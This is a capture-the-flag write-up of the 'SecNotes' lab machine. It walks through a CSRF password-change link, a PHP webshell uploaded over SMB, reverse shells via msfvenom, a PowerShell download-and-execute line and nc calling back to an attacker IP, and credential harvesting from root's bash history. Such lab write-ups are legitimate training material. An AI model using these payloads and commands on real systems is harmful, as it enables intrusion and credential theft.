## SecNotes

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.97 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/4327c940-7d84-48d9-a832-ce699eeb7e1f)

<br>

On port 80, we have a login page. On 8808 there is only an empty Microsoft IIS page.

![login](https://github.com/b1d0ws/OSCP/assets/58514930/d1759649-7c37-441d-8497-3d41a6a9926f)

![port8808](https://github.com/b1d0ws/OSCP/assets/58514930/27a3b6b8-67f0-45f6-8b03-f57a14538858)

<br>

Creating a user, we can enumerate a username on home.php called tyler.

![homePHP](https://github.com/b1d0ws/OSCP/assets/58514930/2105039e-941f-43bc-9437-6a6f43d8fe45)

<br>

Testing features, we can observe that change password request doesn't have CSRF protection.  

On contact feature, we can put a link to trick tyler to access it. Change request method from change password to GET and change his password.

```
http://10.10.10.97/change_pass.php?password=bido333&confirm_password=bido333&submit=submit
```

![changePassPost](https://github.com/b1d0ws/OSCP/assets/58514930/e76e346b-3530-43cc-a2f1-7c4edc07c602)

![changePassGET](https://github.com/b1d0ws/OSCP/assets/58514930/6391ea42-4ee7-49c6-aac8-6892f7ff0c5f)

![contactCSRF](https://github.com/b1d0ws/OSCP/assets/58514930/db29cd1f-6462-4161-8673-24afd254af82)

<br>

Logging as tyler, we find smb credentials. On smb, we can upload a webshell on port 8808 and get a reverse shell with nc.

```
smbclient //secnotes.htb/new-site -U "tyler"

# One way to get shell
msfvenom -p php/reverse_php LHOST=10.10.14.21 LPORT=3333 -f raw > shell.php
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/Invoke-PowerShellTcp.ps1')

# Other way

vi webshell.php
<?php system($_REQUEST['cmd']) ?>

# We need to use 64, on 32 bits the command "bash" doesn't work
put nc64.exe

http://10.10.10.97:8808/webshell.php?cmd=nc64.exe 10.10.14.21 9001 -e powershell

# We can use Invoke-PowerShellTcp as well

http://10.10.10.97:8808/webshell.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp.ps1
```

![tylerNotes](https://github.com/b1d0ws/OSCP/assets/58514930/659a6dba-8be6-41aa-a8c5-10de1468093a)

![smbclientWebshell](https://github.com/b1d0ws/OSCP/assets/58514930/0e1b02eb-a49b-4b8e-8b10-b246b367583b)

![revShell](https://github.com/b1d0ws/OSCP/assets/58514930/36652ceb-8ff0-4d24-a98d-3fe41b1c4268)

<br>

### Root Flag

Inside tyler desktop, there is bash.lnk. This give us a hint that maybe bash is available on this Windows machine.

![tylerDesktop](https://github.com/b1d0ws/OSCP/assets/58514930/172aa9bc-48d4-418c-af45-ec7636c7aa1a)

<br>

Using bash binary, we can navigate on Linux machine. Inside root home directory, we can find credentials inside his bash_history and use psexec to get as shell with it.

```
bash
cat /root/.bash_history
```

![bashHistory](https://github.com/b1d0ws/OSCP/assets/58514930/ed6557a1-8dc4-4f40-90f7-8d7b7928e8cd)

![adminShell](https://github.com/b1d0ws/OSCP/assets/58514930/66338ddd-a515-42c5-87da-42475191527e)
